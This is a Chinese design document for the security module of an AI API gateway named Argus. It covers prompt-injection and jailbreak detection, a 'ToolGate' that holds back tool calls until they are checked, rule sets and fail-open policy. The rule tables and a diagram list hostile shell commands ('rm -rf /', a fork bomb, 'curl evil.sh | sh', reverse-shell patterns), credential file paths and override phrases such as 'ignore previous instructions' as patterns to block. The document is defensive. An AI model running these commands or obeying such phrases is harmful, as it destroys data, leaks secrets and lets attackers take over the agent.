# 12 · 安全

> 状态：Draft v2 · 最后更新 2026-08-20
> 前置：`11-observation-model.md`（IR）、`10-streaming.md`（背压）
> 相关 ADR：`ADR/ADR-012-fail-open-observation.md`

---

## 1. Problem

AI API 的安全边界与传统 API 完全不同：

- **攻击面在自然语言里**：prompt injection、jailbreak 藏在 user message 或工具返回的网页内容里，正则和 WAF 基本无效。
- **危险在输出侧**：模型可能输出 `rm -rf /`、泄漏 system prompt 里的密钥、生成 SQL 注入语句。
- **执行发生在客户端**：Argus 看到的是 `tool_calls`，真正执行 `bash` 的是客户端的 agent。Argus 是**唯一能在执行前看到这个决定**的位置。
- **流式输出不可撤回**：等看完整个回复再判断，token 早就发出去了。

同时有一个残酷的现实约束：**安全模块本身不能成为可用性风险**。一个因为安全检测超时而拒绝所有 AI 请求的网关，比没有安全检测更糟。

---

## 2. Goals

- G-Sec1 覆盖四个检测时机：request-time、stream-time、tool-call-time、post-response。
- G-Sec2 规则引擎不依赖 LLM；LLM detector 是可选增强。
- G-Sec3 安全检测的失败（超时、崩溃、依赖不可用）默认 **fail-open**，且可按策略改为 fail-close。
- G-Sec4 提供一个**零感知延迟**的工具调用阻断机制。
- G-Sec5 所有判定可解释：能说清"因为哪条规则、匹配了什么"。
- G-Sec6 检测器的误报可被快速抑制（不需要发版）。

## 3. Non-goals

- 不做通用 WAF（SQL 注入、XSS 的 HTTP 层检测）——那是前置网关的事。
- 不做 DLP 的完整实现（只做模式级的凭据/PII 检测）。
- 不承诺检出率。prompt injection 没有可靠的通用检测方法，本系统提供的是**纵深防御的一层**，不是保证。
- 不做模型输出的"内容安全"（暴力/色情等）——provider 自己有 moderation，重复做价值低。

---

## 4. 四个检测时机

```mermaid
flowchart LR
    A["请求到达"] --> B["① PreflightGuard<br/>request-time<br/>内联 · 可阻断"]
    B --> C["转发到 provider"]
    C --> D["响应流"]
    D --> E["② StreamGuard<br/>stream-time<br/>旁路 · 默认不阻断"]
    D --> F["③ ToolGate<br/>tool-call-time<br/>可扣留 · 零感知延迟"]
    D --> G["流结束"]
    G --> H["④ PostGuard<br/>post-response<br/>永远旁路 · 不可阻断"]

    style B fill:#fdd,stroke:#c44
    style F fill:#ffd,stroke:#a80
    style E fill:#eef
    style H fill:#eef
```

| 时机 | 位置 | 能否阻断 | 延迟影响 | 检测内容 |
|------|------|---------|---------|---------|
| ① **PreflightGuard** | 主链路内联（P6） | ✅ 完全阻断 | 有（硬超时 50ms） | system/user/tool 定义/tool 结果 |
| ② **StreamGuard** | 旁路 | 只能**截断**已在进行的流 | 无（默认）/ 有（`delay_window`） | 输出文本、reasoning |
| ③ **ToolGate** | 主链路（条件性） | ✅ 阻断单个工具调用 | **零感知**（见 §6.2） | tool name + arguments |
| ④ **PostGuard** | 旁路 | ❌ 不可阻断 | 无 | 完整交互 + 可选 LLM 分析 |

---

## 5. 检测内容

### 5.1 请求侧

| 内容 | 提取方式 | 主要风险 |
|------|---------|---------|
| system prompt | 协议特定（Anthropic 顶层 `system`；OpenAI `messages[role=system/developer]`） | 泄漏其中的密钥；被覆写 |
| user message | `messages[role=user]` | prompt injection、jailbreak |
| tool 定义 | `tools[]` / `functions[]` | 恶意工具描述（描述里藏指令） |
| tool 结果 | `messages[role=tool]` / `content[type=tool_result]` | **最高风险**：来自外部网页/文件的间接注入 |
| 附件元数据 | `content[type=image].source` 等 | 超大文件、可疑 URL、data URI 走私 |

**tool_result 是最高风险源**，因为它承载的是不可信的外部内容（网页抓取、文件读取、API 返回），而模型会把它当作可信上下文处理。这是间接 prompt injection 的主要载体。因此 `tool_result` 默认接受更严格的规则集。

### 5.2 响应侧

| 内容 | 来源（IR） | 主要风险 |
|------|-----------|---------|
| assistant 文本 | `BlockKind::Text` | 泄漏 system prompt、泄漏凭据、有害指导 |
| reasoning | `BlockKind::Reasoning` | 同上，且推理过程可能泄漏更多 |
| tool 调用名 | `BlockKind::ToolUse.name` | 调用了不该调的工具 |
| tool 参数 | `BlockDelta::Json` 累积后 | **执行前的最后拦截点**：shell 命令、SQL、路径、URL |

### 5.3 提取器的容错要求

安全提取器（`SecurityExtractor`）与 `09-observers.md` §8 的最小探测不同——它需要深入解析请求 JSON。

**硬性要求：提取失败绝不导致请求失败。**

```rust
pub enum ExtractionResult {
    /// 结构化提取成功
    Structured(RequestContent),
    /// 结构解析失败，降级为整个 body 的原始文本
    RawFallback { text: Cow<'_, str>, reason: ExtractError },
}
```

降级为 `RawFallback` 时，规则引擎仍然可以跑（正则/关键词在原始 JSON 文本上一样能匹配），只是丢失了"这段文本来自哪个角色"的上下文，因此**基于角色的规则被跳过**，只跑通用规则。

---

## 6. 阻断机制

### 6.1 PreflightGuard（request-time）

内联在 P6，是唯一能"干净地"拒绝一个请求的时机（客户端收到正常的 4xx，什么都没发生）。

```rust
pub struct PreflightConfig {
    /// 硬超时。超过则按 on_timeout 处理。
    pub timeout: Duration,              // 默认 50ms
    pub on_timeout: FailMode,           // 默认 Open
    pub on_error: FailMode,             // 默认 Open
}
```

50ms 是刻意设的很紧的预算。规则引擎在这个预算内能做什么：

| 检测 | 典型耗时（100KB 请求） | 说明 |
|------|---------------------|------|
| 关键词/短语匹配（Aho-Corasick） | ~200 µs | 一次扫描匹配上千个模式 |
| 正则集（RegexSet） | ~1–5 ms | `regex` crate 的 RegexSet 一次扫描 |
| 熵检测（找高熵字符串 = 疑似密钥） | ~500 µs | 滑动窗口 |
| 结构规则（工具白名单、消息数上限） | ~10 µs | |
| 已知 injection 指纹（哈希） | ~50 µs | |

**都在预算内**。超出预算的是 LLM detector（数百 ms 到数秒）——因此 **LLM detector 绝不放在 PreflightGuard**（见 §7.3）。

### 6.2 ToolGate：零感知延迟的工具阻断

**这是本设计最重要的安全机制。**

关键洞察：**tool call 的参数对人是不可见的，客户端必须等到完整 JSON 才能执行它。** 因此在 tool call block 结束时扣留几毫秒做检查，用户完全无感知——而对文本输出做同样的事会明显增加延迟。

工作方式：

```text
正常文本 delta ────────────────────────→ 立刻转发（不受影响）

tool_use block:
  content_block_start (tool_use)  ────→ 立刻转发
  input_json_delta ×N              ──┐
                                     ├─ 扣留在 GateBuffer
  content_block_stop               ──┘
                                     ↓
                              ToolGate 检查（预算 20ms）
                                     ↓
            ┌────────── Allow ──────┴────── Block ──────────┐
            ↓                                                ↓
    一次性 flush 全部扣留的帧              不 flush，改为发出：
    （客户端看到完整 tool_use）           · 一个说明性的 text block，或
                                          · error event 并终止流
```

**为什么这是安全的**：客户端在收到 `content_block_stop` 之前不可能执行工具（参数还不完整）。我们扣留的正是这段"客户端反正也用不了"的时间。

**延迟代价**：`tool_use` block 的最后一帧延迟 ≤ 20ms。对文本输出**零影响**。

**内存代价**：`GateBuffer` 需要缓存一个 tool_use block 的全部帧。上限：

```toml
[security.tool_gate]
enabled = true
timeout = "20ms"
on_timeout = "open"           # 超时放行（fail-open）
max_buffered_bytes = "256KiB" # 单个 tool block 的扣留上限
on_overflow = "flush"         # 超过则直接放行（不能无界缓冲）
```

**实现位置**：这是唯一一处 StreamGuard 需要触及主链路的地方。实现为主链路 Body 上的一个可选包装器 `GatedBody`，只在 `tool_gate.enabled` 且当前 block 是 `tool_use` 时激活。

```rust
/// 主链路上的可选 Body 包装器。仅在 tool_gate.enabled 且当前处于 tool_use block 时激活。
/// 组合顺序：GatedBody<Cancellable<TeeBody<Incoming>>>
pin_project! {
    pub struct GatedBody<B> {
        #[pin] inner: B,
        signal: GateSignal,          // Observer → 主链路的唯一反向通道（AtomicU8）
        state: GateState,
        cfg: Arc<ToolGateConfig>,
    }
}

// GatedBody 的状态
enum GateState {
    /// 直通（99% 的时间）
    PassThrough,
    /// 正在扣留一个 tool block
    Holding { buf: Vec<Bytes>, bytes: usize, started: Instant },
}
```

`GatedBody` 需要知道"当前是不是在 tool_use block 里"——这个信息来自 Observer。因此需要一条**从 Observer 回到主链路的窄通道**：

```rust
/// Observer → 主链路的唯一反向通道。只传状态，不传数据。
pub struct GateSignal(Arc<AtomicU8>);   // PassThrough | StartHold | Release | Block
```

用 `AtomicU8` 而不是 channel，避免主链路 await。主链路每次 `poll_frame` 读一次（一个 relaxed load，~1ns）。

> **诚实的复杂度说明**：ToolGate 是唯一违反"观测完全不影响主链路"原则的机制。它引入了主链路对 Observer 的时序依赖。因此：
> - 默认 `enabled = false`，由需要它的 workspace 显式开启。
> - `on_timeout = "open"` 与 `max_buffered_bytes` 保证最坏情况下退化为直通。
> - Observer 挂掉（channel 关闭）时 `GateSignal` 自动置为 `PassThrough`。

### 6.3 StreamGuard 的 delay_window（可选）

对文本输出的实时阻断，唯一方式是引入滞后窗口：

```toml
[security.stream_guard]
mode = "observe"          # observe | delay_window
delay_window = "0ms"      # mode=delay_window 时生效，建议 100–300ms
```

`delay_window = 200ms` 时，每个 frame 被扣留 200ms 再发出，给 StreamGuard 一个检查窗口。

**代价是诚实的**：TTFT 增加 200ms，每个 token 也延迟 200ms（但 token 之间的间隔不变，所以打字机效果的"流畅度"不受影响，只是整体晚 200ms 开始）。

**默认关闭**。适用场景：高合规要求的内部工具，用户能接受可感知的延迟。

### 6.4 已经输出之后发现风险 —— 直接回答

这是必须诚实回答的问题（第十九节 Q14）。

**已经写入客户端 socket 的字节无法收回。** 没有任何技术手段能改变这一点。能做的是：

| 措施 | 效果 | 局限 |
|------|------|------|
| **① 立即截断流** | 阻止后续内容（危险内容常在后面继续展开，如完整的脚本） | 已发出的部分留在客户端 |
| **② 发出协议内的 error event** | 客户端 SDK 会抛异常，agent 框架通常会中止后续处理 | 依赖客户端行为 |
| **③ 阻断该会话的后续请求** | 把 `conversation_id` 加入 taint 列表，下一轮请求直接 403 | 只对多轮场景有效 |
| **④ 阻断 tool call** | 如果危险内容后面跟着 tool call，ToolGate 仍能拦住执行 | 需要开启 ToolGate |
| **⑤ 高优先级告警 + 记录** | 人工介入 | 事后 |
| **⑥ 收紧策略** | 自动把该 API Key 的策略升级为 `delay_window` 或更严的规则集 | 影响后续请求性能 |

**最重要的一条是 ④**：在 agent 场景下，真正造成损害的往往不是模型说了什么，而是**客户端执行了什么**。文本泄漏出去很糟，但 `rm -rf` 被执行更糟。ToolGate 恰好覆盖了后者，而且是零感知延迟的。

所以本设计的立场是：

> **不追求"阻止模型说出危险内容"（做不到且代价高），而是聚焦"阻止危险内容被执行"（做得到且代价低）。**

截断流的实现：

```rust
// StreamGuard 判定 Block 后
ctx.cancel.cancel_with(CancelReason::SecurityBlock { rule_id });
// → Cancellable<TeeBody> 的 poll_frame 返回 Err
// → hyper 关闭流
// → 但在关闭前，ErrorRenderer 写入一个协议内的 error event
```

对 Anthropic：
```text
event: error
data: {"type":"error","error":{"type":"argus_security_block","message":"Response terminated by security policy (rule: shell-destructive-command). Request ID: req_01J..."}}
```

对 OpenAI Chat：发一个含 `error` 的 chunk 后关闭，**且不发 `[DONE]`**（`06-data-plane.md` §9）。

---

## 7. 检测引擎

### 7.1 分层

```text
Layer 0  结构规则      工具白名单、消息数、body 大小、模型白名单        ~10 µs
Layer 1  模式匹配      Aho-Corasick 关键词 + RegexSet                  ~1–5 ms
Layer 2  语义启发式    熵检测、命令解析、URL 分析、编码检测             ~1–3 ms
Layer 3  LLM Detector  可选、异步、只在 PostGuard                      ~200ms–2s
```

Layer 0–2 是**确定性的**，可以在 PreflightGuard 的 50ms 预算内跑完。Layer 3 只在旁路。

### 7.2 规则模型

```rust
pub struct Rule {
    pub id: RuleId,                  // "shell-destructive-command"
    pub version: u32,
    pub enabled: bool,
    pub severity: Severity,          // Info | Low | Medium | High | Critical
    pub target: RuleTarget,          // 检测什么
    pub matcher: Matcher,            // 怎么匹配
    pub action: SecurityAction,      // 匹配后做什么
    pub timing: EnumSet<Timing>,     // 在哪些时机生效
}

pub enum RuleTarget {
    SystemPrompt, UserMessage, ToolDefinition, ToolResult,
    AssistantText, Reasoning,
    ToolCallName, ToolCallArguments { tool: Option<CompactString> },
    Any,
}

pub enum Matcher {
    Keywords(Arc<AhoCorasick>),
    Regex(Arc<RegexSet>),
    /// 高熵字符串检测（疑似密钥）
    Entropy { min_len: usize, min_bits_per_char: f32 },
    /// 已知 injection 模式的指纹
    Fingerprint(Arc<HashSet<u64>>),
    /// shell 命令的结构化分析
    ShellCommand(Arc<ShellRuleSet>),
    /// 工具名白/黑名单
    ToolAllowlist(Arc<HashSet<CompactString>>),
    /// 组合
    All(Vec<Matcher>), Any(Vec<Matcher>), Not(Box<Matcher>),
}
```

### 7.3 内置规则集（MVP）

| 规则族 | 目标 | 示例 | 默认 action |
|--------|------|------|------------|
| `credential-leak` | 全部 | AWS AKIA/ASIA、`sk-ant-`、`sk-proj-`、GitHub `ghp_`、私钥 PEM 头、高熵 base64 | `Block`（请求侧）/ `Flag`（响应侧） |
| `pii` | 请求 + 响应 | 身份证、信用卡（含 Luhn 校验）、手机号、邮箱 | `Flag`（默认不阻断，误报率高） |
| `shell-destructive` | ToolCallArguments | `rm -rf /`、`mkfs`、`dd of=/dev/`、`:(){ :\|:& };:`、`chmod -R 777 /` | `Block` |
| `shell-exfiltration` | ToolCallArguments | `curl ... \| sh`、`wget ... -O- \| bash`、反弹 shell 模式 | `Block` |
| `sql-destructive` | ToolCallArguments | `DROP DATABASE`、无 WHERE 的 `DELETE`/`UPDATE`、`TRUNCATE` | `RequireReview` |
| `path-traversal` | ToolCallArguments | `../../`、`/etc/shadow`、`~/.ssh/`、`.aws/credentials` | `Block` |
| `prompt-injection` | UserMessage + **ToolResult** | "ignore previous instructions"、"你现在是"、角色重定义模式、隐藏字符（零宽、双向控制符） | `Flag`（ToolResult 时 `Warn`） |
| `jailbreak` | UserMessage | 已知越狱模板指纹（DAN 等）、大量重复的 role-play 前缀 | `Flag` |
| `system-prompt-leak` | AssistantText | 输出中出现与本次 system prompt 高度重合的长片段 | `Flag` |
| `tool-abuse` | ToolCallName | 调用了不在该 API Key `allowed_tools` 里的工具 | `Block` |
| `encoding-smuggle` | 请求全部 | base64/hex 编码的可疑内容、零宽字符隐写 | `Flag` |

**关于 `prompt-injection` 的诚实说明**：这类规则的检出率有限（模式匹配只能抓住已知模板），误报率也不低。它的价值在于：(a) 抓住低水平的自动化攻击；(b) 作为信号喂给 Layer 3；(c) 在 `ToolResult` 上下文中格外有用（正常的网页内容不该包含"ignore previous instructions"）。**不应宣称它能防住定向攻击。**

### 7.4 LLM Detector（Layer 3，可选）

```toml
[security.llm_detector]
enabled = false            # 默认关闭
model = "claude-haiku"     # 走 Argus 自己的路由（dogfooding）
timing = ["post_response"] # 只在 PostGuard，绝不在 preflight
trigger = "on_flag"        # always | on_flag | sampled
sample_rate = 0.01
timeout = "5s"
max_input_chars = 20000
concurrency = 4            # 全局并发上限（bulkhead）
```

设计要点：

1. **只在 PostGuard**。放在 preflight 会让每个请求增加数百 ms 到数秒，不可接受。
2. **`trigger = "on_flag"` 默认**：只有 Layer 0–2 已经 flag 的交互才送去 LLM 复核。这把 LLM 调用量降到总量的百分之几，同时用 LLM 降低误报（大部分 flag 是误报，LLM 能识别出来）。
3. **有并发上限（bulkhead）**：`concurrency = 4` 的信号量。满了就跳过（fail-open），不排队。防止安全检测自己变成流量放大器。
4. **走 Argus 自己的路由**：detector 的调用也经过完整的 Argus 链路（但 `observe = Off` 且标记 `internal = true`，避免无限递归观测）。
5. **成本可见**：detector 消耗的 token 计入一个专用的 `_argus_internal` workspace，可查询。

**递归防护**：detector 请求携带 `x-argus-internal: security-detector`，Gatekeeper 识别后禁止其再触发 detector。

---

## 8. 判定与策略

### 8.1 Action 语义

```rust
pub struct SecurityVerdict {
    /// 合并后的最严 action（见 §8.2）
    pub action: SecurityAction,
    /// 全部命中的规则，用于解释判定（G-Sec5）。内容已按 §9.1 脱敏。
    pub hits: SmallVec<[RuleHit; 4]>,
    /// 产生该判定的时机
    pub timing: Timing,
    /// 判定耗时，用于 argus_security_check_duration_seconds
    pub elapsed: Duration,
    /// true 表示这是一次 fail-open 的降级放行（超时/异常），而非真正检查通过。
    /// 必须与「检查通过」区分，否则无法审计安全能力的实际覆盖率。
    pub degraded: Option<DegradeReason>,
}

pub enum DegradeReason { Timeout, ExtractFailed, RulePanic, DetectorUnavailable }

pub enum SecurityAction {
    /// 放行，不记录（用于显式豁免规则）
    Allow,
    /// 放行，记录 security_event（severity=Info/Low）
    Flag,
    /// 放行，记录，且在响应头加 x-argus-warning
    Warn,
    /// 阻断
    Block,
    /// 阻断，且创建一个待人工审批的记录
    RequireReview,
}
```

`RequireReview` 的语义：请求被拒绝（返回 403 + `review_id`），但记录进 `security_reviews` 表。管理员可以在 Dashboard 批准，批准后**该 API Key 在 TTL 内对相同指纹的请求放行**。这适合"DROP DATABASE 这类操作需要人工确认"的场景。

MVP 只实现同步拒绝 + 记录；批准后的自动放行排在 Phase 3。

### 8.2 多规则命中的合并

```rust
fn combine(verdicts: &[SecurityVerdict]) -> SecurityVerdict {
    // 取最严格的 action
    let action = verdicts.iter().map(|v| v.action).max().unwrap_or(Allow);
    // 但保留所有命中的规则，用于解释
    SecurityVerdict { action, hits: verdicts.iter().flat_map(|v| &v.hits).collect(), .. }
}
```

`SecurityAction` 实现 `Ord`：`Allow < Flag < Warn < RequireReview < Block`。

### 8.3 策略绑定

```rust
pub struct PolicySet {
    /// 按优先级排序，第一个匹配的生效
    pub bindings: Vec<PolicyBinding>,
    pub default: Arc<Policy>,
}

pub struct PolicyBinding {
    pub selector: PolicySelector,    // workspace / api_key / model / tag
    pub policy: Arc<Policy>,
}

pub struct Policy {
    pub rules: Arc<RuleSet>,
    pub preflight: PreflightConfig,
    pub stream_guard: StreamGuardConfig,
    pub tool_gate: ToolGateConfig,
    pub post_guard: PostGuardConfig,
    /// 全局 fail 模式覆盖
    pub fail_mode: FailMode,          // Open | Close
    /// 规则级抑制（快速止损误报）
    pub suppressions: Arc<HashSet<RuleId>>,
}
```

`suppressions` 是运维逃生舱：某条规则误报炸了，可以在 Control Plane 里一键抑制，15 秒内（配置 refresh 周期）全网生效，无需发版。这是 G-Sec6。

### 8.4 会话级 taint

```rust
pub struct ConversationTaint {
    pub conversation_id: ConversationId,
    pub reason: RuleId,
    pub tainted_at: SystemTime,
    pub ttl: Duration,
}
```

某次交互触发 `Block` 后，可选地把整个会话标记为 taint，后续请求直接拒绝。

**限制**：只对 `conversation_link = Explicit` 的会话生效（见 `11-observation-model.md` §9）。基于推断的 conversation_id 做阻断会误伤无关请求。

存储：内存 `HashMap` + TTL（默认 1 小时），不落 PG（重启后失效是可接受的）。多实例时不共享——这是已知的弱点，可选用 Redis 共享。

---

## 9. 敏感数据处理

### 9.1 审计存储的脱敏

安全模块检测到的敏感内容会被记录在 `security_events` 里。**记录敏感内容本身就是风险**。

```rust
pub struct RuleHit {
    pub rule_id: RuleId,
    pub target: RuleTarget,
    /// 匹配位置（字节 offset），不含内容
    pub span: Range<u32>,
    /// 匹配内容的脱敏形式
    pub redacted_sample: CompactString,   // "AKIA****************"
    /// 完整匹配内容的哈希，用于去重与关联
    pub match_hash: u64,
}
```

- `credential-leak` 规则命中时，**绝不存储完整匹配内容**，只存前 4 后 0 字符 + 长度 + hash。
- `pii` 规则命中时同理。
- 其他规则可存储上下文片段（前后各 64 字符），受 workspace 的 `store_security_context` 开关控制。

### 9.2 Anthropic thinking signature

`thinking` block 的 `signature` 是 Anthropic 用于验证推理块未被篡改的签名。它：
- **必须原样透传**（否则多轮对话中回传时会被 Anthropic 拒绝）
- 在审计存储中**保留**（否则无法还原完整对话）
- 但在 `/admin/v1/audit/.../raw` 的响应中默认脱敏（它不是有分析价值的内容，只是一串密文）

### 9.3 raw 内容的加密

```toml
[storage.encryption]
# 对 raw_request / raw_events 的内容做静态加密
encrypt_payloads = false     # 默认关闭
```

默认关闭是因为：加密后无法用 PostgreSQL 做内容检索，而审计的核心用途之一就是"搜索谁提到过 X"。开启后 `15-storage.md` §9 的检索能力会显著受限。这个取舍留给用户。

---

## 10. Fail 模式矩阵

完整矩阵见 `ADR/ADR-012-fail-open-observation.md`，此处是安全模块部分：

| 失败 | 默认 | 可配置 | 理由 |
|------|------|--------|------|
| PreflightGuard 超时（>50ms） | **Open** | ✅ | 超时通常意味着请求异常大，不是攻击信号 |
| PreflightGuard panic | **Open** | ❌ | 我们的 bug 不应变成客户的故障 |
| 规则编译失败（配置错误） | **Open**（该规则被跳过） | ✅ | 单条坏规则不应禁用整个策略 |
| SecurityExtractor 解析失败 | **Open**（降级 RawFallback） | ❌ | |
| ToolGate 超时（>20ms） | **Open**（放行） | ✅ | |
| ToolGate 缓冲溢出 | **Open**（flush） | ❌ | 不能无界缓冲 |
| LLM detector 超时/失败 | **Open**（跳过） | ✅ | |
| LLM detector 并发满 | **Open**（跳过） | ❌ | 排队会拖垮自己 |
| PostGuard 任何失败 | **Open** | ❌ | 它本来就不能阻断 |
| `security_events` 写入失败 | **Open**（走 Spool） | ✅ | |

**唯一建议改为 fail-close 的场景**：高合规环境下的 `PreflightGuard 超时`。此时应同时把 `timeout` 调大（如 200ms）并接受 TTFT 增加。

---

## 11. Data Flow：一次 ToolGate 阻断

```mermaid
sequenceDiagram
    participant C as Client (agent)
    participant M as 主链路 GatedBody
    participant O as Observer
    participant G as ToolGate

    Note over M,O: 正常文本 delta 直通
    M-->>C: content_block_delta (text) ×N

    O->>M: GateSignal = StartHold
    Note over M: 检测到 tool_use block 开始
    M->>M: 扣留 content_block_start(tool_use)
    M->>M: 扣留 input_json_delta ×N
    M->>M: 扣留 content_block_stop
    O->>G: 检查 tool="bash", args={"command":"curl evil.sh | sh"}
    G->>G: 规则 shell-exfiltration 命中，severity=Critical
    G-->>O: SecurityVerdict { action: Block }
    O->>M: GateSignal = Block
    M->>M: 丢弃扣留的帧（客户端从未见过这个 tool call）
    M-->>C: event: error<br/>data: {"type":"error","error":{"type":"argus_security_block",...}}
    M->>M: 关闭流
    Note over C: agent 收到 error，不会执行任何命令
    O->>O: 记录 security_event (Critical) + 告警
```

关键：客户端**从未看到过这个 tool call**，因此绝无执行可能。这是比"事后告警"强得多的保护。

---

## 12. Failure Modes

| 场景 | 行为 |
|------|------|
| 规则集为空 | 全部放行，记 `argus_security_no_rules_total` 指标（配置错误的信号） |
| 单条正则灾难性回溯 | `regex` crate 保证线性时间，无回溯风险。但仍设 `Matcher` 级超时 |
| Aho-Corasick 模式过多导致内存膨胀 | 编译时限制模式总数（默认 10k），超过则拒绝该规则集并保留旧的 |
| ToolGate 开启但 Observer 已挂 | `GateSignal` 自动 `PassThrough`，退化为无 gate |
| ToolGate 遇到嵌套/交错的 tool block | 按 `BlockCoord` 独立扣留，互不影响 |
| `delay_window` 下客户端断开 | 扣留的帧直接丢弃，正常收尾 |
| LLM detector 自己被 prompt injection | detector 的 prompt 使用结构化输入 + 输出约束（只能返回枚举值），且不执行任何工具 |
| taint 表无界增长 | TTL + 容量上限（默认 10k 条，LRU 淘汰） |
| 误报导致大量 Block | `suppressions` 一键抑制；`Warn` 模式灰度新规则 |

---

## 13. Trade-offs

| 选择 | 收益 | 代价 |
|------|------|------|
| ToolGate 而非全量 delay | 零感知延迟的真实阻断 | 只保护工具执行，不阻止文本泄漏 |
| ToolGate 默认关闭 | 主链路默认无耦合 | 需要用户显式开启才有保护 |
| LLM detector 只在 PostGuard | TTFT 不受影响 | 无法阻断，只能事后 |
| `trigger = on_flag` | LLM 调用量降到 1–5% | 完全绕过 Layer 0–2 的攻击也绕过了 Layer 3 |
| 默认 fail-open | 安全故障不影响可用性 | 安全模块挂了会静默失去保护（靠指标告警补） |
| PII 默认只 Flag | 误报不阻断业务 | 真实泄漏也只是记录 |
| 敏感匹配内容脱敏存储 | 审计库本身不成为泄漏源 | 排查时看不到完整内容 |
| 会话 taint 只在内存 | 无外部依赖 | 重启失效，多实例不共享 |

---

## 14. Alternatives Considered

**A. 全量 `delay_window` 作为默认（缓冲所有输出 200ms）。**
能阻断文本，但对所有请求增加 200ms TTFT。对交互式应用不可接受。**否决为默认**，保留为可选。

**B. 用 LLM 做实时流式检测（边生成边送给小模型判断）。**
成本翻倍、延迟不可控、且小模型的判断本身可被 injection 影响。**否决**。

**C. 在 provider 侧启用 moderation（如 OpenAI 的 moderation endpoint）。**
增加一次往返、只覆盖内容安全不覆盖 tool abuse、且不是所有 provider 都有。**作为补充而非替代**，可作为 Layer 3 的一个 detector 实现。

**D. 不做请求侧检测，只做响应侧。**
请求侧的凭据泄漏（用户不小心把 AWS key 粘进 prompt）是真实且高频的问题，且是唯一能干净阻断的时机。**否决**。

**E. 用 eBPF / 沙箱在客户端侧拦截工具执行。**
这是更彻底的方案，但超出网关的职责范围，且要求控制客户端环境。**超出范围**，但可以作为 Argus 的补充产品。

**F. 把安全判定做成同步的、可阻断的 PostGuard。**
逻辑上不可能——PostGuard 运行时流已经结束了。**无效方案**。

---

## 15. Decision

1. 四个检测时机：PreflightGuard（内联可阻断）、StreamGuard（旁路）、ToolGate（条件性内联）、PostGuard（永远旁路）。
2. **ToolGate 是核心安全机制**：扣留 tool_use block 到 `content_block_stop`，检查后放行或丢弃，零感知延迟。默认关闭，需显式开启。
3. 规则引擎分 4 层，Layer 0–2 确定性且在 50ms 预算内；**LLM detector 只在 PostGuard 且默认 `trigger=on_flag`**。
4. 已输出后发现风险的处置：截断流 + 协议内 error event + 会话 taint + ToolGate 拦执行 + 告警。**明确承认已发出的字节无法收回**。
5. 安全模块全面 **fail-open**，唯一建议的 fail-close 例外是高合规环境的 preflight 超时。
6. 规则命中的敏感内容脱敏存储（凭据/PII 只存前缀 + hash）。
7. `suppressions` 提供无需发版的误报止损。
8. 设计立场：**不追求阻止模型"说出"危险内容，聚焦阻止危险内容"被执行"**。

---

## 16. Open Questions

| # | 问题 | 现状 | 何时决定 |
|---|------|------|---------|
| OQ-1 | ToolGate 的 20ms 预算是否够跑完 shell 命令的结构化分析？ | 未实测 | 实现后 bench |
| OQ-2 | 会话 taint 是否需要 Redis 共享？ | 内存 | 多实例部署且有真实需求时 |
| OQ-3 | `prompt-injection` 规则的误报率能否降到可用水平？ | 未知 | 需要真实流量样本 |
| OQ-4 | 是否需要支持用户自定义规则（正则）？如何防止用户写出灾难性规则？ | 未做 | Phase 3；`regex` crate 无回溯，主要风险是模式数量 |
| OQ-5 | `RequireReview` 的审批流程与 TTL 语义如何设计？ | 只做拒绝 | Phase 3 |
| OQ-6 | 是否需要对 reasoning 内容做与文本相同强度的检测？（reasoning 更长，成本更高） | 当前同等对待 | 有性能数据后 |
